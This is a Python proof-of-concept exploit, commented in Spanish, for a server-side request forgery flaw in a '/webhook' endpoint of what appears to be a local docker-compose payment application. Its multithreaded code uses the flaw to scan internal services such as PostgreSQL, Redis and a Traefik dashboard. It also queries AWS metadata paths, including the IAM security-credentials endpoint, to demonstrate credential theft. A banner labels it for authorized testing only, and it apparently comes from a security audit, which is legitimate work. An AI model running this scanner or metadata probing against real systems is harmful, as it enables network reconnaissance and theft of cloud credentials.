#!/usr/bin/env python3
"""
PoC #1: SSRF (Server-Side Request Forgery) - Escaneo de Red Interna
=====================================================================
Vulnerabilidad: worker.py línea 10-13
El endpoint /webhook acepta cualquier URL sin validación y realiza peticiones GET.

Impacto:
- Escaneo de puertos/servicios internos
- Acceso a servicios no expuestos (bases de datos, APIs internas)
- Bypass de firewalls y segmentación de red
- Exfiltración de datos de servicios internos

CVSS: 9.1 (Crítico)
CWE-918: Server-Side Request Forgery (SSRF)
"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuración del objetivo
WORKER_URL = "http://localhost:8000/webhook"

# Servicios internos típicos a escanear
INTERNAL_TARGETS = [
    # Servicios de la aplicación (desde docker-compose.yml)
    ("payment-core", 5000, "Flask Core API"),
    ("users-db", 5432, "PostgreSQL Database"),
    ("reverse-proxy", 8080, "Traefik Dashboard"),

    # Cloud metadata endpoints (crítico en AWS/GCP/Azure)
    ("169.254.169.254", 80, "AWS/Cloud Metadata Service"),
    ("metadata.google.internal", 80, "GCP Metadata"),

    # Servicios internos comunes
    ("localhost", 6379, "Redis"),
    ("localhost", 27017, "MongoDB"),
    ("localhost", 9200, "Elasticsearch"),
    ("localhost", 8500, "Consul"),
    ("localhost", 2379, "etcd"),
]

def exploit_ssrf(target_host, target_port, service_name):
    """Intenta acceder a un servicio interno via SSRF"""
    payload = {
        "url": f"http://{target_host}:{target_port}/"
    }

    try:
        response = requests.post(WORKER_URL, json=payload, timeout=5)
        result = response.json()

        if "code" in result:
            return {
                "host": target_host,
                "port": target_port,
                "service": service_name,
                "status": "ACCESIBLE",
                "http_code": result["code"],
                "vulnerable": True
            }
        else:
            return {
                "host": target_host,
                "port": target_port,
                "service": service_name,
                "status": "ERROR",
                "error": result.get("error", "Unknown"),
                "vulnerable": False
            }
    except Exception as e:
        return {
            "host": target_host,
            "port": target_port,
            "service": service_name,
            "status": "TIMEOUT/ERROR",
            "error": str(e),
            "vulnerable": False
        }


def scan_internal_network():
    """Escanea la red interna aprovechando SSRF"""
    print("=" * 70)
    print("PoC #1: SSRF - Escaneo de Red Interna")
    print("=" * 70)
    print(f"\n[*] Objetivo: {WORKER_URL}")
    print("[*] Iniciando escaneo de servicios internos...\n")

    accessible_services = []

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(exploit_ssrf, host, port, name): (host, port, name)
            for host, port, name in INTERNAL_TARGETS
        }

        for future in as_completed(futures):
            result = future.result()

            if result["vulnerable"]:
                print(f"[+] ENCONTRADO: {result['service']}")
                print(f"    -> {result['host']}:{result['port']} (HTTP {result['http_code']})")
                accessible_services.append(result)
            else:
                print(f"[-] No accesible: {result['service']} ({result['host']}:{result['port']})")

    # Resumen
    print("\n" + "=" * 70)
    print("RESUMEN DEL ATAQUE")
    print("=" * 70)

    if accessible_services:
        print(f"\n[!] Se encontraron {len(accessible_services)} servicios accesibles via SSRF:\n")
        for svc in accessible_services:
            print(f"    - {svc['service']}: http://{svc['host']}:{svc['port']}/")

        print("\n[!] IMPACTO DEMOSTRADO:")
        print("    - El atacante puede acceder a servicios internos no expuestos")
        print("    - Posible acceso a bases de datos, APIs internas, dashboards")
        print("    - En entornos cloud: acceso a metadata con credenciales")
    else:
        print("\n[-] No se encontraron servicios accesibles (el entorno puede no estar activo)")

    return accessible_services


def exploit_cloud_metadata():
    """Intento de acceso a AWS Metadata Service (IMDSv1)"""
    print("\n" + "=" * 70)
    print("PoC #1b: SSRF - Robo de Credenciales Cloud (AWS IMDSv1)")
    print("=" * 70)

    # Endpoints críticos de AWS Metadata
    metadata_endpoints = [
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/meta-data/hostname",
        "/latest/user-data",
    ]

    print("\n[*] Intentando acceder a AWS Metadata Service...\n")

    for endpoint in metadata_endpoints:
        payload = {"url": f"http://169.254.169.254{endpoint}"}

        try:
            response = requests.post(WORKER_URL, json=payload, timeout=3)
            result = response.json()

            if "code" in result and result["code"] == 200:
                print(f"[+] ACCESIBLE: {endpoint}")
                print(f"    -> Potencial robo de credenciales IAM!")
            else:
                print(f"[-] Bloqueado: {endpoint}")
        except:
            print(f"[-] Error: {endpoint}")

    print("\n[!] En un entorno AWS real, esto permitiría robar:")
    print("    - Credenciales IAM temporales")
    print("    - Roles de instancia")
    print("    - Tokens de acceso")


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  SSRF EXPLOITATION TOOLKIT - SOLO PARA PRUEBAS AUTORIZADAS    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    # Verificar que el servicio está activo
    try:
        requests.get(WORKER_URL.replace("/webhook", "/"), timeout=2)
    except:
        print("[!] ADVERTENCIA: El servicio worker no parece estar activo")
        print("[!] Ejecute: docker-compose up -d")
        print("[!] Continuando con la demostración...\n")

    scan_internal_network()
    exploit_cloud_metadata()

    print("\n" + "=" * 70)
    print("FIN DEL PoC - SSRF DEMOSTRADO")
    print("=" * 70)
